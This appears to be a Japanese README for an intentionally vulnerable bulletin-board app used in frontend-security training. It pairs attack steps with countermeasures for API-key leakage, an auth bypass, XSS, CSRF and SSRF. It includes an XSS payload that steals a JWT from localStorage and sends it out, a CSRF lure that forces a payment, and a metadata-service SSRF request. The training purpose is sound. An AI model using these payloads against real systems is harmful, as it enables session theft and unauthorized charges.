# セキュリティ研修用掲示板アプリの脆弱性とその対策

今回フロントエンドセキュリティの脅威や手法を楽しく学ぶ J（脆弱性）- 1 グランプリで使用するアプリケーションです。
脆弱性モリモリ掲示板アプリ security-training-board は意図的に様々なセキュリティ脆弱性を持たせています。

以下に各シナリオにおける攻撃方法と対策をまとめています。

## シナリオ1: APIキー漏洩

### 脆弱性

- クライアント側の環境変数（`NEXT_PUBLIC_`接頭辞を持つもの）がブラウザのJavaScriptで漏洩している
- レイアウトファイル（`layout.tsx`）での意図的な露出

### 攻撃手順

1. ブラウザの開発者ツールを開く
2. コンソールタブを確認

### 対策

- 機密情報はクライアント側で扱わない
- サーバーサイドでのみAPIキーを使用
- 環境変数の接頭辞に`NEXT_PUBLIC_`を使用しない
- 必要な場合は認証されたAPIを経由して安全に情報を取得

## シナリオ2: APIサーバー側における未バリデーション

### 脆弱性

- `/api/premium`エンドポイントがURLパラメータ（`skipAuth=true`）によってバリデーションをバイパス可能
- メンバーシップレベルの確認が不十分

### 攻撃手順

1. プレミアム機能のAPIエンドポイントを発見: `/api/premium`
2. 認証をバイパスするためのパラメータを追加: `/api/premium?skipAuth=true`
3. 無料ユーザーでもプレミアムコンテンツにアクセス可能

### 対策

- サーバー側でのユーザー認証と権限チェックを徹底
- URLパラメータによるセキュリティバイパスを許可しない
- 適切なミドルウェアでリクエストの検証を行う

## シナリオ3: XSS（クロスサイトスクリプティング）

### 脆弱性

- 投稿内容のサニタイズが行われていない
- `dangerouslySetInnerHTML`の使用
- JWTトークンが`SameSite=None`でローカルストレージに保存

### 攻撃手順

1. 以下のようなJavaScriptコードを投稿する:
   ```html
   <script>
     // ユーザーのトークンを盗む
     const token = localStorage.getItem("token");
     // 攻撃者のサーバーに送信
     fetch("http://localhost:3000/api/stolen-tokens", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ token }),
     });
   </script>
   ```
2. 他のユーザーが投稿を閲覧すると、スクリプトが実行されトークンが盗まれる
3. 盗まれたトークンで攻撃者がユーザーになりすまし可能

### 対策

- 入力値のサニタイズ（HTMLタグのエスケープ）
- `dangerouslySetInnerHTML`を使用しない
- Content Security Policy (CSP) の設定
- ローカルストレージに機密情報を保存しない

## シナリオ4: CSRF（クロスサイトリクエストフォージェリ）

こちら別サイトを擬似的に用意。（WIP）

### 脆弱性

- 決済APIにCSRF保護がない
- Originヘッダーやリファラーのチェックがない
- URLパラメータで自動決済が可能（`/payment?autoUpgrade=true&level=vip`）

### 攻撃手順

1. 悪意のあるWebサイトを作成:
   ```html
   <button id="freeGift">無料ギフトをゲット！</button>
   <script>
     document.getElementById("freeGift").addEventListener("click", function () {
       window.location.href =
         "http://localhost:3000/payment?autoUpgrade=true&level=vip";
     });
   </script>
   ```
2. ユーザーがこのボタンをクリックすると、自動的に決済ページに遷移し処理が実行
3. ユーザーの意図しない決済が完了

### 対策

- CSRFトークンの実装
- 重要な操作前に再認証を要求
- SameSite Cookieの設定
- Referer/Originヘッダーの検証
- セッション固有のトークンを使用

## シナリオ5: SSRF（サーバーサイドリクエストフォージェリ）

### 脆弱性

- `/api/cloud-info`エンドポイントが任意のURLにリクエストを送信可能
- ホストヘッダインジェクションに脆弱

### 攻撃手順

1. SSRFに脆弱なエンドポイントを発見: `/api/cloud-info`
2. 以下のようなリクエストを送信:
   ```
   GET /api/cloud-info?url=http://169.254.169.254/latest/api/token HTTP/1.1
   Host: attacker.example.com
   ```
3. パブリッククラウドのメタデータサービスにアクセスしトークンを取得
